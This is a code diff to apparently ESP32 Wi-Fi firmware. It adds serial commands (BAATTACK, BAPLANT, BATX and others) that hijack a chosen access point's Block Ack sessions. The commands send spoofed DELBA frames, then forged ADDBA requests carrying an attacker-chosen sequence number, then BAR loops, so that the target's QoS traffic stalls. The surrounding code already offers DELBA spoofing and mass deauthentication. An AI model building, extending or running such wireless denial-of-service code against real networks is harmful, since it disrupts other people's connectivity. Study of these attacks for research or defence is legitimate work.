@@ -110,6 +110,11 @@ void print_help() {
   Serial.println("INFO DELBA <idx> [reason]          DELBA spoof: tear down Block Ack sessions (1/32/37/38/39)");
   Serial.println("INFO DELBASTOP                     stop the DELBA spoof");
   Serial.println("INFO DELBATEST                     dump the DELBA action frame bytes (format check)");
+  Serial.println("INFO BAATTACK <idx> [step]         BA-session hijack: DELBA -> forged ADDBA (SSN) -> BAR loop");
+  Serial.println("INFO BASTOP                        stop the BA-session hijack");
+  Serial.println("INFO BATEST                        dump the forged ADDBA Request / BAR bytes");
+  Serial.println("INFO BATX                          send one DELBA/ADDBA/BAR and print the driver verdict");
+  Serial.println("INFO BAPLANT <idx> [step]          plant the reorder window once, then stay silent (window-hijack test)");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
   Serial.println("INFO RADIO                         dump the driver's sniffer state (promisc + both filters + channel)");
   Serial.println("INFO CTRLTEST                      inject 10 RTS control frames (can this radio report control frames at all?)");
@@ -327,6 +332,22 @@ void do_status() {
   Serial.print((unsigned)delba_addba_seen());
   Serial.print(" delbar=");
   Serial.print((unsigned)delba_bar_seen());
+  Serial.print(" bamode=");
+  Serial.print(delba_ba_mode() ? 1 : 0);
+  Serial.print(" baaddba=");
+  Serial.print((unsigned)delba_ba_addba_frames());
+  Serial.print(" babar=");
+  Serial.print((unsigned)delba_ba_bar_frames());
+  Serial.print(" badlba=");
+  Serial.print((unsigned)delba_ba_delba_frames());
+  Serial.print(" bassn=");
+  Serial.print((unsigned)delba_ba_last_ssn());
+  Serial.print(" baerr=");
+  Serial.print((unsigned)delba_ba_errors());
+  Serial.print(" bae=");
+  Serial.print((int)delba_ba_last_error());
+  Serial.print(" baplant=");
+  Serial.print((unsigned)delba_ba_planted_frames());
   Serial.print(" delbtr=");
   Serial.print((unsigned)delba_triggered());
   Serial.print(" delbb=");
@@ -579,6 +600,67 @@ void do_delba_stop() {
 
 void do_delba_test() {
   delba_selftest();
+}
+
+// BAATTACK <idx> [step]: hijack the Block Ack sessions of one AP by planting its
+// reorder windows. Needs the sniffer, so any running attack is stopped first.
+void do_ba_attack(int index, long step) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  if (step < 0 || step > 2047) {
+    Serial.println("ERR step must be 0..2047 (0..127 = control run, the window is not moved)");
+    return;
+  }
+  attack_stop();
+  if (!delba_start_ba(index, (uint16_t)step)) {
+    Serial.println("ERR cannot start the BA attack on that network");
+    return;
+  }
+  Serial.printf("OK BAATTACK %d step=%ld ch=%u ssid=%s\n", index, step,
+                (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
+  ui_log("ba attack started");
+}
+
+void do_ba_stop() {
+  const uint32_t delba_n = delba_ba_delba_frames();
+  const uint32_t addba_n = delba_ba_addba_frames();
+  const uint32_t bar_n = delba_ba_bar_frames();
+  delba_stop();
+  Serial.printf("OK BASTOP delba=%u addba=%u bar=%u\n", (unsigned)delba_n, (unsigned)addba_n,
+                (unsigned)bar_n);
+  ui_log("ba attack stopped");
+}
+
+void do_ba_test() {
+  delba_ba_selftest();
+}
+
+// BAPLANT <idx> [step]: a few ADDBA frames with an SSN of our choosing, then no
+// more transmission. If the peer's reorder window really moved, its QoS stream
+// stays dead while we are silent.
+void do_ba_plant(int index, long step) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  if (step < 0 || step > 2047) {
+    Serial.println("ERR step must be 0..2047 (0..127 = control run)");
+    return;
+  }
+  attack_stop();
+  if (!delba_ba_plant_once(index, (uint16_t)step)) {
+    Serial.println("ERR cannot start the BA plant on that network");
+    return;
+  }
+  Serial.printf("OK BAPLANT %d step=%ld ch=%u\n", index, step, (unsigned)WiFi.channel(index));
+  ui_log("ba plant started");
+}
+
+void do_ba_tx() {
+  static const uint8_t probe_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
+  delba_ba_tx_probe(probe_mac);
 }
 
 void do_deauth_all(uint16_t reason) {
@@ -1000,6 +1082,31 @@ void dispatch(char* line) {
     do_delba_stop();
   } else if (strcmp(command, "DELBATEST") == 0) {
     do_delba_test();
+  } else if (strcmp(command, "BAATTACK") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* step_token = strtok(nullptr, " \t");
+    const int ba_idx = parse_index(idx_token);
+    if (ba_idx < 0) {
+      Serial.println("ERR usage: BAATTACK <idx> [step 128-2047]");
+    } else {
+      const long step = step_token ? strtol(step_token, nullptr, 10) : 512;
+      do_ba_attack(ba_idx, step);
+    }
+  } else if (strcmp(command, "BASTOP") == 0) {
+    do_ba_stop();
+  } else if (strcmp(command, "BATEST") == 0) {
+    do_ba_test();
+  } else if (strcmp(command, "BATX") == 0) {
+    do_ba_tx();
+  } else if (strcmp(command, "BAPLANT") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* step_token = strtok(nullptr, " \t");
+    const int plant_idx = parse_index(idx_token);
+    if (plant_idx < 0) {
+      Serial.println("ERR usage: BAPLANT <idx> [step 0-2047]");
+    } else {
+      do_ba_plant(plant_idx, step_token ? strtol(step_token, nullptr, 10) : 512);
+    }
   } else if (strcmp(command, "CTRLFILTER") == 0) {
     do_ctrl_filter(strtok(nullptr, " 	"));
   } else if (strcmp(command, "CTRLTEST") == 0) {
